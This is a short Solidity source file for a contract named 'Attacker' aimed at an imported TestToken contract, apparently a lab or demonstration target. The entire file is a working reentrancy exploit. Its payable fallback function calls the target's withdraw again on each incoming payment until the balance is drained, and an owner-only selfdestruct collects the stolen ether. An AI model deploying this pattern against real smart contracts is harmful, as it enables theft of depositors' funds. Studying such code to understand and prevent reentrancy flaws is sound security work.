pragma solidity^0.4.11;

import './TestToken.sol';

contract Attacker {
  address public tokenAddress;
  address public owner;

  function Attacker(address _tokenAddress) {
    tokenAddress = _tokenAddress;
    owner = msg.sender;
  }

  function deposit() payable returns (bool success) {
    TestToken token = TestToken(tokenAddress);
    tokenAddress.call.value(msg.value)(bytes4(sha3("deposit()")));
  }
  function withdraw(uint256 _value) returns (bool success) {
      TestToken token = TestToken(tokenAddress);
      token.withdraw(_value);
      return true;
  }

  function gimme() {
    require(msg.sender == owner);
    selfdestruct(owner);
  }
  
  function() payable {
    TestToken token = TestToken(tokenAddress);
    if(tokenAddress.balance > msg.value) token.withdraw(msg.value);
  }

}